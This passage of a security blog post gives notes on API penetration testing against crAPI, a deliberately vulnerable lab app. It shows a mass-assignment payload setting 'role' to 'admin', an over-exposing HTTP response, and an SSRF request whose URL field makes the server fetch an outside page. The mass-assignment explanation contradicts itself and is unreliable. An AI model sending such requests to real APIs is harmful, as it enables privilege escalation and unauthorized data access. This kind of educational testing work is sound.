</pre></table></code></div></div><h2 id="mass-assignment"><span style="color: var(--link-color);">Mass Assignment</span></h2><p>Mass assignment vulnerabilities can occur when an attacker is able to modify the request parameters sent to the API in order to set values for attributes they should not have access to, such as administrative privileges or sensitive data.</p><p>An example is the creation of a user. Suppose we have an API endpoint “/users” that allows users to create a new user by sending a JSON payload with the following structure:</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Jane Doe"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jane.doe@example.com"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"user"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>In this case, the API endpoint allows mass assignment, but it also sets a default role of “user” if no role is provided in the request payload.</p><p>If an attacker attempts to modify the request payload to set their own role as that of a privileged user, it would have no effect since the default role of “user” would still be used. For example:</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Jane Doe"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jane.doe@example.com"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>In this case, the “role” parameter would be ignored, and the user would be created with a default role of “user”.</p><p>To discover these “hidden” parameters, you can analyze the source code to check if there is some HTTP parameters that is not validate and is put directly on the system. Or you can check also the JWT token, if there is some useful paramenter and try to put in the request.</p><h2 id="excessive-data-exposure"><span style="color: var(--link-color);">Excessive Data Exposure</span></h2><p>Excessive Data Exposure is also a significant security vulnerability in APIs that can result in the exposure of sensitive data to unauthorized parties. This can occur when an API returns more data than is necessary or appropriate for a given request, or when sensitive data is included in API responses without adequate protection. For example, suppose an API returns sensitive user data, such as passwords or credit card information, in response to a request that was intended to retrieve only basic profile information. If this data is not properly protected, an attacker could potentially intercept or access it and use it for malicious purposes.</p><p>We can see this vulnerability also in crAPI. If we check the “recent posts” section, we see few information, the name of the user, the title, the comment and the data:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/excessive_data_exposure1.png" alt="Comments Section crAPI" /></p><p>But if we check the HTTP response, we can see a lot of information not needed in that section:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">openresty/1.17.8.2</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 08 Apr 2023 16:29:36 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Access-Control-Allow-Headers</span><span class="p">:</span> <span class="s">Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization</span>
<span class="na">Access-Control-Allow-Methods</span><span class="p">:</span> <span class="s">POST, GET, OPTIONS, PUT, DELETE</span>
<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">*</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1617</span>

<span class="p">[</span><span class="w">
   </span><span class="p">{</span><span class="w">
      </span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"EFmnjqRWe5Rc2ZW7tDh9X7"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"title"</span><span class="p">:</span><span class="s2">"Title 3"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"content"</span><span class="p">:</span><span class="s2">"Hello world 3"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"author"</span><span class="p">:{</span><span class="w">
         </span><span class="nl">"nickname"</span><span class="p">:</span><span class="s2">"Robot"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"robot001@example.com"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"vehicleid"</span><span class="p">:</span><span class="s2">"b7b28bc1-24d2-4793-b17c-355e119f59b9"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"profile_pic_url"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
         </span><span class="nl">"created_at"</span><span class="p">:</span><span class="s2">"2023-04-02T15:00:40.246Z"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"comments"</span><span class="p">:[</span><span class="w">
         
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"authorid"</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span><span class="w">
      </span><span class="nl">"CreatedAt"</span><span class="p">:</span><span class="s2">"2023-04-02T15:00:40.246Z"</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="p">{</span><span class="w">
      </span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"fyfCgq6nwiwpmrTz7sVJaS"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"title"</span><span class="p">:</span><span class="s2">"Title 2"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"content"</span><span class="p">:</span><span class="s2">"Hello world 2"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"author"</span><span class="p">:{</span><span class="w">
         </span><span class="nl">"nickname"</span><span class="p">:</span><span class="s2">"Pogba"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"pogba006@example.com"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"vehicleid"</span><span class="p">:</span><span class="s2">"8a4b4f1f-4e2e-444d-9a21-c0ccc5ab801f"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"profile_pic_url"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
         </span><span class="nl">"created_at"</span><span class="p">:</span><span class="s2">"2023-04-02T15:00:40.237Z"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"comments"</span><span class="p">:[</span><span class="w">
         
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"authorid"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="w">
      </span><span class="nl">"CreatedAt"</span><span class="p">:</span><span class="s2">"2023-04-02T15:00:40.237Z"</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="p">{</span><span class="w">
      </span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"DLqPtrUZfueT5mLVjHYHrJ"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"title"</span><span class="p">:</span><span class="s2">"Title 1"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"content"</span><span class="p">:</span><span class="s2">"Hello world 1"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"author"</span><span class="p">:{</span><span class="w">
         </span><span class="nl">"nickname"</span><span class="p">:</span><span class="s2">"Adam"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"adam007@example.com"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"vehicleid"</span><span class="p">:</span><span class="s2">"6f836ff9-883d-4863-b2ce-b04e5e7057a3"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"profile_pic_url"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
         </span><span class="nl">"created_at"</span><span class="p">:</span><span class="s2">"2023-04-02T15:00:40.131Z"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"comments"</span><span class="p">:[</span><span class="w">
         
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"authorid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="w">
      </span><span class="nl">"CreatedAt"</span><span class="p">:</span><span class="s2">"2023-04-02T15:00:40.131Z"</span><span class="w">
   </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></pre></table></code></div></div><p>We can see the email and the id of the users, the vehicle_id. So this endpoint expose sensitive information.</p><h2 id="ssrf"><span style="color: var(--link-color);">SSRF</span></h2><p>Server-side request forgery (SSRF) can also be a significant security vulnerability in APIs that can result in unauthorized access to sensitive data or systems. This can occur when an API allows an attacker to specify the target URL for an HTTP request that is initiated by the API’s server-side code. For example, suppose an API allows users to submit URLs for image processing. An attacker could submit a malicious URL that points to an internal system or network device, which the API’s server-side code would then attempt to access. If the API’s server-side code is vulnerable to SSRF, the attacker could potentially access sensitive data or systems by manipulating the URL.</p><p>In crAPI, we can found this vulnerability in the “Contact Mechanics” (again), since this endpoint take in input an URL. If the backend doesn’t check the URL, an attacker can put malicious server to get the data in response.</p><p>The request from the vulnerable endpoint:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/workshop/api/merchant/contact_mechanic</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8888</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">174</span>
<span class="na">sec-ch-ua</span><span class="p">:</span> <span class="s">" Not A;Brand";v="99", "Chromium";v="104"</span>
<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODA5NjU2MTEsImV4cCI6MTY4MTU3MDQxMX0.kGrBUIXrZabg11fyQ94zqmF5CFTeknYdNEm1JUH_sbfVQ5Ba7AQgFtcKZ3_wBEVT645bDqW0tRyzePXK11Crb1uM-VzGROEcyaLyF3L49Zz3GhI8nfb2JKz3cGzfbFJ4_Z-lj23CSAr4DOr8zmWRuoq0JsBi_XX23BBvqWXWGgFXisDSHi139ruOCe2aXslK0TbRAjfOUtb2KEjNT7spxUTw5f6FnlAVOK3VdOKKkPxG1729XPQSvRWFnoueUj65KY-B3cy9s07Yjsg7BGrOwLpklLeS-Fw4eS3LasMJc49rMOjkkHM7wYIwBy1VRMLwaKbJcVFFlfyLXFbxoib_4Q</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">sec-ch-ua-mobile</span><span class="p">:</span> <span class="s">?0</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span>
<span class="na">sec-ch-ua-platform</span><span class="p">:</span> <span class="s">"Linux"</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://localhost:8888</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-origin</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">cors</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">empty</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://localhost:8888/contact-mechanic?VIN=7CCZG71CRZO653819</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

<span class="p">{</span><span class="w">
   </span><span class="nl">"mechanic_code"</span><span class="p">:</span><span class="s2">"TRAC_JHN"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"problem_details"</span><span class="p">:</span><span class="s2">"Test"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"vin"</span><span class="p">:</span><span class="s2">"7CCZG71CRZO653819"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"mechanic_api"</span><span class="p">:</span><span class="s2">"https://www.google.com"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"repeat_request_if_failed"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
   </span><span class="nl">"number_of_repeats"</span><span class="p">:</span><span class="mi">1</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>And in the response, we got the the Google page:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">openresty/1.17.8.2</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 08 Apr 2023 19:23:31 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Allow</span><span class="p">:</span> <span class="s">POST, OPTIONS</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Origin, Cookie</span>
<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">*</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">16101</span>

<span class="p">{</span><span class="w">
	</span><span class="nl">"response_from_mechanic_api"</span><span class="p">:</span><span class="s2">"&lt;!doctype html&gt;&lt;html itemscope=</span><span class="se">\"\"</span><span class="s2"> itemtype=</span><span class="se">\"</span><span class="s2">http://schema.org/WebPage</span><span class="se">\"</span><span class="s2"> lang=</span><span class="se">\"</span><span class="s2">de-CH</span><span class="se">\"</span><span class="s2">&gt;&lt;head&gt;&lt;meta content=</span><span class="se">\"</span><span class="s2">text/html; charset=UTF-8</span><span class="se">\"</span><span class="s2"> http-equiv=</span><span class="se">\"</span><span class="s2">Content-Type</span><span class="se">\"</span><span class="s2">&gt;&lt;meta content=</span><span class="se">\"</span><span class="s2">/images/branding/googleg/1x/googleg_standard_color_128dp.png</span><span class="se">\"</span><span class="s2"> itemprop=</span><span class="se">\"</span><span class="s2">image</span><span class="se">\"</span><span class="s2">&gt;&lt;title&gt;Google&lt;/title&gt;&lt;script nonce=</span><span class="se">\"</span><span class="s2">boqDTMtYEzH5BQOxfgOUNQ</span><span class="se">\"</span><span class="s2">&gt;(function(){window.google={kEI:'Mr8xZKfzL9CsgQawy7HYCg',kEXPI:'0,1359409,1709,4350,206,4804,2316,383,246,5,1129120,1197715,686,380090,16114,28684,22430,1362,12312,4753,12834,4998,13228,3847,38444,2872,2891,3926,214,7614,606,30668,27618,2404,2614,13142,1,2,346,230,6183,14400,4,1528,2304,42126,13659,4437,16786,5800,2557,4094,7596,1,42154,2,14022,25739,6700,31122,4568,6258,23418,1252,5835,12137,2830,4333,5016,2468,11407,13669,2006,5665,2490,7381,15970,872,19634,7,1922,9779,5864,15527,14763,6305,2007,18192,5796,2,14434,20206,1622,1748,31,668,3211,1097,8051,10909,4412,991,3030,426,5685,1864,1361,6480,1804,7762,467,1150,1093,1759,94,1032,7655,695,473,657,3570,685,357,52 [TRUNCATED]"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"status"</span><span class="p">:</span><span class="mi">200</span><span class="w">
</span><span class="p">}</span><span class="w"> 
</span></pre></table></code></div></div><p>In conclusion, API vulnerabilities such as these explained in this post can pose significant risks to organizations that rely on APIs to support their operations. These vulnerabilities can allow attackers to gain unauthorized access to sensitive data, steal sensitive information, or disrupt critical business processes. To mitigate these risks, organizations should implement robust security measures that include regular security testing and vulnerability assessments, strong authentication and authorization mechanisms, input validation and sanitation, and encryption of sensitive data in transit and at rest. By taking proactive steps to secure their APIs, organizations can better protect their systems and data from potential attacks, while also ensuring that they remain compliant with legal and regulatory requirements. As the use of APIs continues to grow and evolve, it is essential that organizations remain vigilant in their efforts to identify and address potential security risks, and to implement best practices and technologies to ensure the ongoing security and reliability of their API-enabled systems.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>Notes</a>, <a href='/categories/api/'>API</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/owasp/" class="post-tag no-text-decoration" >OWASP</a> <a href="/tags/learn/" class="post-tag no-text-decoration" >Learn</a> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=API Pentest - CinnamonSec&url=https://nananan.github.io/posts/api-pentest/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=API Pentest - CinnamonSec&u=https://nananan.github.io/posts/api-pentest/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=API Pentest - CinnamonSec&url=https://nananan.github.io/posts/api-pentest/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/kerberos/">The Kerberos grand hotel</a><li><a href="/posts/steel-mountain/">Steel Mountain</a><li><a href="/posts/windows-privesc-arena/">Windows PrivEsc Arena</a><li><a href="/posts/alfred/">Alfred</a><li><a href="/posts/thin-job/">Thin Job</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/learn/">Learn</a> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/alfred/">Alfred</a> <a class="post-tag" href="/tags/cronjob/">CronJob</a> <a class="post-tag" href="/tags/cve-2021-43397/">CVE-2021-43397</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/exploit/">Exploit</a> <a class="post-tag" href="/tags/filethingie/">FileThingie</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/proxy/"><div class="card-body"> <span class="timeago small" > May 30, 2022 <i class="unloaded">2022-05-30T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Proxy</h3><div class="text-muted small"><p> What about Proxy? In this article, I will explain briefly something about Proxy. Why? Why not 😆 On the big internet, there are many articles about Proxy but I would write mine! Watch this ...</p></div></div></a></div><div class="card"> <a href="/posts/kerberos/"><div class="card-body"> <span class="timeago small" > Aug 6, 2023 <i class="unloaded">2023-08-06T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>The Kerberos grand hotel</h3><div class="text-muted small"><p> Kerberos Kerberos, though a complex topic, can be better understood by drawing parallels with a hotel analogy. Imagine the Kerberos system as a hotel, and its various components as essential ser...</p></div></div></a></div><div class="card"> <a href="/posts/seasurfer/"><div class="card-body"> <span class="timeago small" > Jun 22, 2022 <i class="unloaded">2022-06-22T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sea Surfer</h3><div class="text-muted small"><p> Sea Surfer You can find this CTF here Enumeration As always, I began with a nmap scan (what is more important than enumeration? beer? 🧐): sudo nmap -sV -sS -sC -O -v -p- 10.10.181.107 [sudo] pas...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/seasurfer/" class="btn btn-outline-primary" prompt="Older"><p>Sea Surfer</p></a> <a href="/posts/kerberos/" class="btn btn-outline-primary" prompt="Newer"><p>The Kerberos grand hotel</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/_cinnamon_92">Eliana Cannella</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/learn/">Learn</a> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/alfred/">Alfred</a> <a class="post-tag" href="/tags/cronjob/">CronJob</a> <a class="post-tag" href="/tags/cve-2021-43397/">CVE 2021 43397</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/exploit/">Exploit</a> <a class="post-tag" href="/tags/filethingie/">FileThingie</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://nananan.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
